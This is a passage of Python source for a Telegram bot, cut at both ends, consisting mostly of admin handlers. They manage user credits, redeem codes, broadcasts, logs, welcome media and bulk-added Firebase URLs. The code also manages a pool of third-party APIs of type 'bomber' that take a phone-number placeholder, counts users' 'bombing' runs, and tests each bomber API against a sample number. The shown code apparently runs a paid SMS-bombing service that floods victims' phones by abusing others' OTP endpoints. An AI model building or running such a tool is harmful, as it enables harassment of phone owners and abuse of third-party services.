                   f"📊 Count: {data.get('count', 0)}"
        return "❌ Age not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 18. Gender Predictor
async def get_gender_by_name(name):
    try:
        success, text, status = await safe_api_call(f"https://api.genderize.io?name={name}", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            gender = data.get('gender', 'N/A')
            if gender == 'male':
                gender = '👨 Male'
            elif gender == 'female':
                gender = '👩 Female'
            return f"🧑‍🤝‍🧑 **Gender Prediction**\n\n" \
                   f"📛 Name: {data.get('name', 'N/A')}\n" \
                   f"🧑‍🤝‍🧑 Gender: {gender}\n" \
                   f"📊 Accuracy: {round(data.get('probability', 0) * 100, 1)}%"
        return "❌ Gender not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 19. Nationality Predictor
async def get_nationality_by_name(name):
    try:
        success, text, status = await safe_api_call(f"https://api.nationalize.io?name={name}", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            if data.get('country'):
                country = data['country'][0]
                return f"🌍 **Nationality Prediction**\n\n" \
                       f"📛 Name: {data.get('name', 'N/A')}\n" \
                       f"🌍 Country: {country.get('country_id', 'N/A')}\n" \
                       f"📊 Accuracy: {round(country.get('probability', 0) * 100, 1)}%"
        return "❌ Nationality not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ===================== SPORTS API FUNCTIONS =====================

# 20. Football Predictions
async def get_football_predictions():
    try:
        success, text, status = await safe_api_call("https://api.football-data.org/v4/matches", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            matches = data.get('matches', [])[:5]
            result = "⚽ **Football Predictions**\n━━━━━━━━━━━━━━━━━━━\n\n"
            for match in matches:
                home = match.get('homeTeam', {}).get('name', 'N/A')
                away = match.get('awayTeam', {}).get('name', 'N/A')
                result += f"🏟️ {home} vs {away}\n"
                result += f"📅 {match.get('utcDate', 'N/A')[:10]}\n\n"
            return result
        return "❌ Football predictions not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ===================== ADMIN FUNCTIONS =====================
async def admin_add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🟢 **Add Credit**\n\nFormat: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'add_credit'

async def admin_remove_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🔴 **Remove Credit**\n\nFormat: `USER_ID AMOUNT`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'remove_credit'

async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    conn = await get_db()
    cursor = await conn.execute("SELECT user_id, username, balance, total_sms, total_bombing, total_bulk, status FROM users ORDER BY user_id DESC LIMIT 20")
    users = await cursor.fetchall()
    
    if not users:
        await update.message.reply_text("👥 No users found!", reply_markup=get_management_menu())
        return
    
    response = "👥 **Recent Users**\n━━━━━━━━━━━━━━━━━━━\n\n"
    for i, user in enumerate(users, 1):
        response += f"{i}. ID: `{user[0]}`\n   👤 {user[1] or 'N/A'}\n   💰 {user[2]} | 📨{user[3]} | 💣{user[4]} | 📤{user[5]}\n   🚦 {user[6]}\n\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_management_menu())

async def admin_top_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    conn = await get_db()
    cursor = await conn.execute("SELECT user_id, username, balance FROM users ORDER BY balance DESC LIMIT 10")
    users = await cursor.fetchall()
    
    if not users:
        await update.message.reply_text("No users found!", reply_markup=get_management_menu())
        return
    
    response = "🏆 **Top 10 Users**\n━━━━━━━━━━━━━━━━━━━\n\n"
    medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    for i, user in enumerate(users):
        response += f"{medals[i]} ID: `{user[0]}` - {user[1] or 'N/A'} - 💰{user[2]}\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_management_menu())

async def admin_total_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    conn = await get_db()
    cursor = await conn.execute("SELECT SUM(balance), COUNT(*) FROM users")
    stats = await cursor.fetchone()
    await update.message.reply_text(f"💰 **Total Balance**\n\n👥 Total Users: {stats[1]}\n💰 Total Balance: {stats[0] or 0}", parse_mode="Markdown", reply_markup=get_management_menu())

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("📣 **Broadcast**\n\nSend your broadcast message:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'broadcast'

async def admin_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🎟️ **Create Redeem Code**\n\nFormat: `CODE AMOUNT USAGES`\nExample: `BONUS25 25 50`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'create_code'

async def admin_sms_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🔑 **SMS API Manager**", parse_mode="Markdown", reply_markup=get_sms_api_menu())

async def admin_set_sms_api_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🔑 **Set SMS API Key**\n\nEnter your SMS API key:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'set_sms_key'

async def admin_set_sms_api_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🌐 **Set SMS API URL**\n\nEnter your SMS API URL:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'set_sms_url'

async def admin_view_sms_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    url = get_setting('sms_api_url', 'Not Set')
    key = get_setting('sms_api_key', 'Not Set')
    key_display = key[:10] + '...' if len(key) > 10 else key
    
    await update.message.reply_text(
        f"🔑 **SMS API Configuration**\n\n🌐 URL: `{url}`\n🔑 Key: `{key_display}`",
        parse_mode="Markdown",
        reply_markup=get_sms_api_menu()
    )

async def admin_api_manager(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("📡 **API Manager**", parse_mode="Markdown", reply_markup=get_api_manager_menu())

async def admin_add_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text(
        "➕ **Add API**\n\n**Format:** `NAME|METHOD|URL|BODY|TYPE`\n\n"
        "**Example:**\n`MyAPI|POST|https://api.example.com|{\"phone\":\"{phone}\"}|bomber`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_api'

async def admin_edit_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, api_type FROM apis ORDER BY id")
    rows = await cursor.fetchall()
    
    if not rows:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_api_manager_menu())
        return
    
    response = "✏️ **Edit API**\n\nSend the **ID** of the API to edit:\n\n"
    for row in rows:
        response += f"`{row[0]}` → {row[1]} ({row[2]})\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'edit_api_id'

async def admin_delete_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name FROM apis ORDER BY id")
    rows = await cursor.fetchall()
    
    if not rows:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_api_manager_menu())
        return
    
    response = "🗑️ **Delete API**\n\nSend the **ID** of the API to delete:\n\n"
    for row in rows:
        response += f"`{row[0]}` → {row[1]}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'delete_api'

async def admin_toggle_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, is_active FROM apis ORDER BY id")
    rows = await cursor.fetchall()
    
    if not rows:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_api_manager_menu())
        return
    
    response = "🔄 **Toggle API**\n\nSend the **ID** of the API to enable/disable:\n\n"
    for row in rows:
        status = "🟢 Active" if row[2] else "🔴 Inactive"
        response += f"`{row[0]}` → {row[1]} ({status})\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'toggle_api'

async def admin_view_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, method, url, is_active, api_type FROM apis ORDER BY id")
    rows = await cursor.fetchall()
    
    if not rows:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_api_manager_menu())
        return
    
    response = "📋 **All APIs**\n━━━━━━━━━━━━━━━━━━━\n\n"
    for row in rows:
        status = "🟢 Active" if row[4] else "🔴 Inactive"
        response += f"**ID:** `{row[0]}`\n"
        response += f"📡 {row[1]} ({row[5]})\n"
        response += f"📝 {row[2]}\n"
        response += f"🚦 {status}\n━━━━━━━━━━━━━━━━━━━\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_api_manager_menu())

async def admin_api_inventory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT api_name, total_credits, used_credits, remaining_credits, status FROM api_inventory")
    apis = await cursor.fetchall()
    
    if not apis:
        await update.message.reply_text("📭 No API inventory found!", reply_markup=get_api_inventory_menu())
        return
    
    total = sum(api[1] for api in apis)
    used = sum(api[2] for api in apis)
    remaining = sum(api[3] for api in apis)
    
    response = f"📊 **API Inventory**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    response += f"📌 Total APIs: `{len(apis)}`\n"
    response += f"💰 Total Credits: `{total}`\n"
    response += f"✅ Used: `{used}`\n"
    response += f"📊 Remaining: `{remaining}`\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_api_inventory_menu())

async def admin_recharge_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        "💰 **Recharge API**\n\n**Format:** `API_NAME AMOUNT`\nExample: `Paperfly 500`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'recharge_api'

async def admin_view_all_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT api_name, total_credits, used_credits, remaining_credits, status FROM api_inventory")
    apis = await cursor.fetchall()
    
    if not apis:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_api_inventory_menu())
        return
    
    response = "📊 **All APIs**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for api in apis:
        status_emoji = "🟢" if api[4] == 'active' and api[3] > 50 else "🔴"
        response += f"{status_emoji} **{api[0]}**\n"
        response += f"   ├─ Total: `{api[1]}`\n"
        response += f"   ├─ Used: `{api[2]}`\n"
        response += f"   └─ Remaining: `{api[3]}`\n\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_api_inventory_menu())

async def admin_daily_bonus_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    current = get_setting('daily_bonus_enabled', 'false')
    amount = get_setting('daily_bonus_amount', '5')
    cooldown = get_setting('daily_bonus_cooldown', '24')
    
    await update.message.reply_text(
        f"🎁 **Daily Bonus Control**\n\n"
        f"📌 Status: {'✅ ON' if current == 'true' else '❌ OFF'}\n"
        f"💰 Bonus: `{amount}`\n"
        f"⏰ Cooldown: `{cooldown}` hours\n\n"
        f"**Commands:**\n`ON` - Enable\n`OFF` - Disable\n`AMOUNT 10` - Change bonus\n`COOLDOWN 12` - Change cooldown",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'daily_bonus_control'

async def admin_redeem_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT code, amount, usages FROM redeem_codes ORDER BY created_at DESC LIMIT 10")
    codes = await cursor.fetchall()
    
    code_list = ""
    if codes:
        for code in codes:
            status = "✅" if code[2] > 0 else "❌"
            code_list += f"{status} `{code[0]}` → 💰{code[1]} (Remaining: {code[2]})\n"
    else:
        code_list = "📭 No codes"
    
    await update.message.reply_text(
        f"🎟️ **Redeem Code Control**\n\n{code_list}\n\n"
        f"**Commands:**\n`CREATE CODE AMOUNT USAGES`\n`DELETE CODE`\n`DELETE ALL`\n`EDIT CODE NEW_AMOUNT NEW_USAGES`\n`LIST`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'redeem_control'

async def admin_balance_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        f"💰 **Balance Control**\n\n"
        f"**Commands:**\n`GIFT ALL AMOUNT` - To all\n`GIFT USER_ID AMOUNT` - To specific\n`SET USER_ID AMOUNT` - Set\n`RESET ALL` - Reset\n`REPORT` - Report",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'balance_control'

async def admin_user_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    await update.message.reply_text(
        f"👥 **User Control**\n\n"
        f"**Commands:**\n`BLOCK USER_ID`\n`UNBLOCK USER_ID`\n`INFO USER_ID`\n`LIST USERS`\n`MAKE PREMIUM USER_ID`\n`REMOVE PREMIUM USER_ID`\n`DELETE USER_ID`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'user_control'

async def admin_api_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT api_name, total_calls, total_success, total_failed, last_used FROM api_stats ORDER BY total_calls DESC")
    all_apis = await cursor.fetchall()
    
    if not all_apis:
        await update.message.reply_text("📊 No API stats yet!", reply_markup=get_reports_menu())
        return
    
    response = "📈 **API Statistics**\n━━━━━━━━━━━━━━━━━━━\n\n"
    for api in all_apis[:10]:
        success_rate = round((api[2] / api[1]) * 100, 2) if api[1] > 0 else 0
        response += f"📡 {api[0]}\n   ├─ Calls: {api[1]}\n   ├─ ✅ {api[2]} | ❌ {api[3]}\n   └─ Rate: {success_rate}%\n\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_reports_menu())

async def admin_live_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT COUNT(*) FROM api_usage")
    total_calls = await cursor.fetchone()
    cursor = await conn.execute("SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now')")
    today_calls = await cursor.fetchone()
    cursor = await conn.execute("SELECT COUNT(*) FROM api_usage WHERE success = 1")
    total_success = await cursor.fetchone()
    cursor = await conn.execute("SELECT COUNT(*) FROM api_usage WHERE success = 0")
    total_failed = await cursor.fetchone()
    
    response = f"📊 **LIVE API STATS**\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'━' * 20}\n\n"
    response += f"📈 **Overview:**\n"
    response += f"├─ Total API Calls: {total_calls[0]}\n"
    response += f"├─ Today's Calls: {today_calls[0]}\n"
    response += f"├─ ✅ Success: {total_success[0]}\n"
    response += f"└─ ❌ Failed: {total_failed[0]}"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_reports_menu())

async def admin_api_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, method, is_active, api_type FROM apis ORDER BY id")
    rows = await cursor.fetchall()
    
    if not rows:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_settings_menu())
        return
    
    response = "📡 **API List**\n━━━━━━━━━━━━━━━━━━━\n\n"
    response += f"📌 Total: {len(rows)}\n\n"
    for row in rows:
        status = "🟢" if row[3] else "🔴"
        response += f"{row[0]}. {status} {row[1]} ({row[4]}) - {row[2]}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_settings_menu())

async def tail_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    try:
        log_file = "bot.log"
        if not os.path.exists(log_file):
            await update.message.reply_text("📭 No log file found!", reply_markup=get_settings_menu())
            return
        
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            last_lines = lines[-50:] if len(lines) > 50 else lines
        
        if not last_lines:
            await update.message.reply_text("📭 Log file is empty!", reply_markup=get_settings_menu())
            return
        
        log_text = "📜 **Latest Logs (Last 50 lines)**\n━━━━━━━━━━━━━━━━━━━\n\n"
        for line in last_lines:
            log_text += f"`{line.strip()}`\n"
        
        if len(log_text) > 4000:
            with open("temp_log.txt", 'w', encoding='utf-8') as f:
                f.write(log_text)
            await update.message.reply_document(document=open("temp_log.txt", 'rb'), caption="📜 Log file", reply_markup=get_settings_menu())
            os.remove("temp_log.txt")
        else:
            await update.message.reply_text(log_text, parse_mode="Markdown", reply_markup=get_settings_menu())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_settings_menu())

async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    try:
        log_file = "bot.log"
        if os.path.exists(log_file):
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write("")
            await update.message.reply_text("🗑️ **Log file cleared!**", parse_mode="Markdown", reply_markup=get_settings_menu())
        else:
            await update.message.reply_text("📭 No log file found!", reply_markup=get_settings_menu())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_settings_menu())

async def admin_test_all_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, url, body, method FROM apis WHERE is_active = 1 AND api_type = 'bomber'")
    apis = await cursor.fetchall()
    
    if not apis:
        await update.message.reply_text("📭 No APIs found!", reply_markup=get_api_manager_menu())
        return
    
    msg = await update.message.reply_text(f"🧪 Testing {len(apis)} APIs...\n⏳ Please wait...")
    
    working = []
    not_working = []
    
    for api in apis:
        try:
            api_id, name, url, body, method = api
            test_phone = "01700000000"
            body_data = json.loads(body) if body else {}
            body_data = replace_phone(body_data, test_phone)
            
            if method.upper() == 'GET':
                success, text, status = await safe_api_call(url, method='GET', params=body_data, timeout=10)
            else:
                success, text, status = await safe_api_call(url, method='POST', data=body_data, timeout=10)
            
            if success and check_success(text, status):
                working.append({"id": api_id, "name": name})
            else:
                not_working.append({"id": api_id, "name": name})
        except Exception as e:
            not_working.append({"id": api[0], "name": api[1]})
        
        if (len(working) + len(not_working)) % 3 == 0:
            try:
                await msg.edit_text(f"🧪 Testing...\n✅ Working: {len(working)}\n❌ Not working: {len(not_working)}")
            except:
                pass
    
    result = "🧪 **API Test Results**\n━━━━━━━━━━━━━━━━━━━\n\n"
    result += f"✅ Working: {len(working)}\n"
    result += f"❌ Not working: {len(not_working)}\n\n"
    
    if working:
        result += "✅ **Working APIs:**\n"
        for api in working[:15]:
            result += f"├─ `{api['id']}` → {api['name']}\n"
        if len(working) > 15:
            result += f"└─ ...and {len(working)-15} more\n"
    
    if not_working:
        result += "\n❌ **Non-working APIs:**\n"
        for api in not_working[:15]:
            result += f"├─ `{api['id']}` → {api['name']}\n"
        if len(not_working) > 15:
            result += f"└─ ...and {len(not_working)-15} more\n"
        
        result += f"\n📌 Use '🗑️ Delete Inactive' to delete these APIs"
    
    await msg.edit_text(result, parse_mode="Markdown", reply_markup=get_api_manager_menu())

async def admin_delete_inactive_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name FROM apis WHERE is_active = 0")
    inactive = await cursor.fetchall()
    
    if not inactive:
        await update.message.reply_text("✅ No inactive APIs!", reply_markup=get_api_manager_menu())
        return
    
    response = "🗑️ **Delete Inactive APIs**\n━━━━━━━━━━━━━━━━━━━\n\n"
    response += "Delete these APIs?\n\n"
    
    for api in inactive:
        response += f"├─ `{api[0]}` → {api[1]}\n"
    
    response += f"\n📌 Total: {len(inactive)}\n"
    response += "\nType `DELETE_ALL` to delete all\nOr `DELETE ID` to delete specific"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'delete_inactive'

async def process_delete_inactive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    message = update.message.text.strip()
    
    if message.upper() == 'DELETE_ALL':
        conn = await get_db()
        cursor = await conn.execute("SELECT id, name FROM apis WHERE is_active = 0")
        apis = await cursor.fetchall()
        
        if not apis:
            await update.message.reply_text("📭 No inactive APIs!", reply_markup=get_api_manager_menu())
            context.user_data['admin_state'] = None
            return
        
        for api in apis:
            await conn.execute("DELETE FROM apis WHERE id = ?", (api[0],))
        
        await conn.commit()
        await admin_log(ADMIN_ID, "Deleted Inactive APIs", None, f"{len(apis)} APIs deleted")
        await load_apis()
        
        await update.message.reply_text(f"✅ Deleted {len(apis)} inactive APIs!", reply_markup=get_api_manager_menu())
        context.user_data['admin_state'] = None
        return
    
    elif message.upper().startswith('DELETE '):
        try:
            api_id = int(message.split()[1])
            conn = await get_db()
            cursor = await conn.execute("SELECT name, is_active FROM apis WHERE id = ?", (api_id,))
            api = await cursor.fetchone()
            
            if not api:
                await update.message.reply_text("❌ API not found!", reply_markup=get_api_manager_menu())
                context.user_data['admin_state'] = None
                return
            
            if api[1] == 1:
                await update.message.reply_text("❌ This API is active! Deactivate it first.", reply_markup=get_api_manager_menu())
                context.user_data['admin_state'] = None
                return
            
            await conn.execute("DELETE FROM apis WHERE id = ?", (api_id,))
            await conn.commit()
            await admin_log(ADMIN_ID, "Deleted Inactive API", None, f"{api[0]}")
            await load_apis()
            
            await update.message.reply_text(f"✅ API `{api[0]}` deleted!", parse_mode="Markdown", reply_markup=get_api_manager_menu())
        except ValueError:
            await update.message.reply_text("❌ Invalid ID! Use: `DELETE ID`", reply_markup=get_api_manager_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_api_manager_menu())
        
        context.user_data['admin_state'] = None
        return
    
    else:
        await update.message.reply_text("❌ Invalid command!\n\n`DELETE_ALL` - Delete all\n`DELETE ID` - Delete specific", reply_markup=get_back_keyboard())
        return


async def admin_list_welcome_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = await list_welcome_media()
    if not rows:
        await update.message.reply_text("📭 No welcome media yet.\nUse **Add Media** to upload Photo/Video/GIF.", parse_mode="Markdown", reply_markup=get_media_manager_menu())
        return
    text = "📋 **Welcome Media List**\n━━━━━━━━━━━━━━━━━━━\n\n"
    for r in rows:
        status = "🟢" if r[2] else "🔴"
        prem = "👑" if r[3] else ""
        cap = (r[4] or "")[:40]
        text += f"{status} ID:`{r[0]}` | {r[1]} {prem}\n   Caption: {cap}\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_media_manager_menu())

async def admin_toggle_welcome_media(update: Update, context: ContextTypes.DEFAULT_TYPE, enable: bool):
    if update.effective_user.id != ADMIN_ID:
        return
    await update_setting("welcome_media_enabled", "true" if enable else "false")
    state = "ENABLED ✅" if enable else "DISABLED ❌"
    await update.message.reply_text(f"🎬 Welcome media {state}", reply_markup=get_media_manager_menu())

async def admin_set_media_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    current = get_setting("welcome_media_mode", "random")
    new_mode = "sequential" if current == "random" else "random"
    await update_setting("welcome_media_mode", new_mode)
    await update.message.reply_text(f"🎲 Mode set to: **{new_mode}**", parse_mode="Markdown", reply_markup=get_media_manager_menu())

async def admin_delete_welcome_media_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = await list_welcome_media()
    if not rows:
        await update.message.reply_text("📭 No media to delete.", reply_markup=get_media_manager_menu())
        return
    text = "🗑️ **Delete Welcome Media**\n\nSend the ID to delete:\n\n"
    for r in rows:
        text += f"`{r[0]}` → {r[1]}\n"
    text += "\nOr send `ALL` to delete everything."
    context.user_data["admin_state"] = "delete_welcome_media"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_back_keyboard())

async def admin_test_welcome_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    caption = get_setting("welcome_message", "🔥 Welcome!")
    sent = await send_welcome_media(update, context, caption_text=caption, is_premium=True)
    if sent:
        await update.message.reply_text("✅ Test media sent above.", reply_markup=get_media_manager_menu())
    else:
        await update.message.reply_text("❌ No active media or send failed. Add media first.", reply_markup=get_media_manager_menu())

async def process_add_welcome_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle photo/video/gif/document upload for welcome media."""
    if update.effective_user.id != ADMIN_ID:
        return
    msg = update.message
    file_id = None
    media_type = None
    caption = msg.caption or ""

    if msg.photo:
        file_id = msg.photo[-1].file_id
        media_type = "photo"
    elif msg.video:
        file_id = msg.video.file_id
        media_type = "video"
    elif msg.animation:
        file_id = msg.animation.file_id
        media_type = "animation"
    elif msg.document:
        file_id = msg.document.file_id
        mime = (msg.document.mime_type or "").lower()
        if "gif" in mime or (msg.document.file_name or "").lower().endswith(".gif"):
            media_type = "animation"
        elif "video" in mime:
            media_type = "video"
        elif "image" in mime:
            media_type = "photo"
        else:
            media_type = "document"
    else:
        await update.message.reply_text("❌ Send a Photo, Video, GIF/Animation or Document.", reply_markup=get_back_keyboard())
        return

    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO welcome_media (file_id, media_type, caption, is_active, is_premium_only, added_by) VALUES (?, ?, ?, 1, 0, ?)",
            (file_id, media_type, caption, ADMIN_ID)
        )
        await conn.commit()
        await update.message.reply_text(
            f"✅ **Media saved!**\n\nType: `{media_type}`\nCaption: {caption[:80] or 'None'}",
            parse_mode="Markdown",
            reply_markup=get_media_manager_menu()
        )
        try:
            admin = update.effective_user
            await log_admin_action(context, admin, "🎬 WELCOME MEDIA ADDED", f"Type: {media_type}")
        except Exception:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Save error: {e}", reply_markup=get_media_manager_menu())
    context.user_data["admin_state"] = None

async def process_delete_welcome_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    text = (update.message.text or "").strip().upper()
    conn = await get_db()
    if text == "ALL":
        await conn.execute("DELETE FROM welcome_media")
        await conn.commit()
        await update.message.reply_text("🗑️ All welcome media deleted.", reply_markup=get_media_manager_menu())
    else:
        try:
            mid = int(text)
            await conn.execute("DELETE FROM welcome_media WHERE id = ?", (mid,))
            await conn.commit()
            await update.message.reply_text(f"🗑️ Media ID `{mid}` deleted.", parse_mode="Markdown", reply_markup=get_media_manager_menu())
        except ValueError:
            await update.message.reply_text("❌ Send a valid ID or ALL.", reply_markup=get_back_keyboard())
            return
    context.user_data["admin_state"] = None



async def admin_firebase_manager(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text(
        "🔥 **Firebase Manager**\n\nAdd via URL or .txt\nKeep only active · Remove dead",
        parse_mode="Markdown",
        reply_markup=get_firebase_manager_menu()
    )

async def admin_firebase_add_url_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.user_data["admin_state"] = "firebase_add_urls"
    await update.message.reply_text(
        "🔥 **Add Firebase URL(s)**\n\nSend one URL per line (or multiple):\n`https://...`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def admin_firebase_add_txt_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.user_data["admin_state"] = "firebase_add_txt"
    await update.message.reply_text(
        "🔥 **Add Firebase from TXT**\n\nSend a `.txt` file with URLs (one per line)\nOR paste plain text with URLs.",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def process_firebase_add_urls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    text = update.message.text or ""
    urls = await parse_firebase_lines(text)
    if not urls:
        await update.message.reply_text("❌ No URLs found.", reply_markup=get_firebase_manager_menu())
        context.user_data["admin_state"] = None
        return
